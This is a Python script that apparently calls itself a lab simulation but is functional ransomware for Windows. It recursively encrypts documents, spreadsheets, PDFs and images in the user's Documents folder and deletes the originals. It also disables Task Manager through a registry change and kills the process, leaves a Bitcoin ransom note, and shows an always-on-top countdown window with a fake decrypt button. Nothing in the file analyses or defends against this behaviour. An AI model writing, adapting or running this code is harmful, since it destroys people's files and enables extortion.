#!/usr/bin/env python3
import os
import sys
import argparse
from cryptography.fernet import Fernet
import subprocess
import tkinter as tk
from tkinter import messagebox, scrolledtext
import threading

# --- CONFIGURATION --- #
FILE_EXTENSIONS = ['.txt', '.pdf', '.docx', '.xlsx', '.jpg']  # Target file types
RANSOM_NOTE = """# YOUR FILES HAVE BEEN ENCRYPTED!

To decrypt, send 0.1 BTC to: [BTC_ADDRESS]
Contact: hacker@example.com
"""

# --- KEY GENERATION --- #
def generate_key():
    return Fernet.generate_key()

# --- ENCRYPTION LOGIC --- #
def encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)
        with open(filepath + '.ENCRYPTED', 'wb') as f:
            f.write(encrypted_data)
        os.remove(filepath)  # Delete original
    except Exception as e:
        print(f"[!] Error encrypting {filepath}: {e}")

# --- DISABLE TASK MANAGER (WINDOWS) --- #
def disable_task_manager():
    try:
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
             "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"],
            shell=True
        )
        subprocess.run("taskkill /f /im taskmgr.exe", shell=True, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[!] Failed to disable Task Manager: {e}")

# --- RANSOM NOTE DEPLOYMENT --- #
def drop_note(directory):
    with open(os.path.join(directory, 'READ_ME.txt'), 'w') as f:
        f.write(RANSOM_NOTE)

# --- GUI RANSOMWARE DEMAND --- #
class RansomwareGUI:
    def __init__(self, root, key):
        self.root = root
        self.key = key
        self.root.title("!!! FILE DECRYPTION REQUIRED !!!")
        self.root.geometry("600x400")
        self.root.resizable(False, False)
        self.root.attributes("-topmost", True)  # Always on top
        
        # Main Frame
        frame = tk.Frame(root, padx=20, pady=20)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Warning Label
        tk.Label(frame, text="YOUR FILES HAVE BEEN ENCRYPTED!", fg="red", font=("Arial", 16, "bold")).pack(pady=10)
        
        # Instructions
        tk.Label(frame, text="To recover your files, follow these steps:", font=("Arial", 12)).pack(pady=5)
        
        # Scrolled Text for Ransom Note
        self.text_area = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=60, height=10)
        self.text_area.insert(tk.INSERT, RANSOM_NOTE)
        self.text_area.configure(state='disabled')
        self.text_area.pack(pady=10)
        
        # Countdown Timer
        self.time_left = 3600  # 1 hour countdown
        self.timer_label = tk.Label(frame, text=f"Time left: {self.time_left // 60}m {self.time_left % 60}s", font=("Arial", 12, "bold"))
        self.timer_label.pack(pady=10)
        
        # Decrypt Button (Fake)
        tk.Button(frame, text="DECRYPT FILES (AFTER PAYMENT)", command=self.fake_decrypt, bg="red", fg="white").pack(pady=10)
        
        # Start Countdown
        self.update_timer()

    def update_timer(self):
        if self.time_left > 0:
            self.time_left -= 1
            self.timer_label.config(text=f"Time left: {self.time_left // 60}m {self.time_left % 60}s")
            self.root.after(1000, self.update_timer)
        else:
            self.timer_label.config(text="TIME EXPIRED! FILES PERMANENTLY LOCKED!", fg="red")

    def fake_decrypt(self):
        messagebox.showwarning("Payment Required", "Decryption key will be sent after Bitcoin payment is confirmed.")

# --- MAIN FUNCTION --- #
def main():
    # Check if running on Windows
    if not sys.platform.startswith('win'):
        print("[!] This simulation only works on Windows.")
        sys.exit(1)

    # Disable Task Manager
    disable_task_manager()

    # Generate encryption key
    key = generate_key()
    print(f"[*] Encryption Key (KEEP FOR DECRYPTION): {key.decode()}")

    # Encrypt files in background thread
    def encrypt_thread():
        target_dir = os.path.expanduser("~\\Documents")  # Default target (modify for labs)
        for root, _, files in os.walk(target_dir):
            for file in files:
                if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                    encrypt_file(os.path.join(root, file), key)
        drop_note(target_dir)

    threading.Thread(target=encrypt_thread, daemon=True).start()

    # Launch GUI
    root = tk.Tk()
    app = RansomwareGUI(root, key)
    root.mainloop()

if __name__ == "__main__":
    main()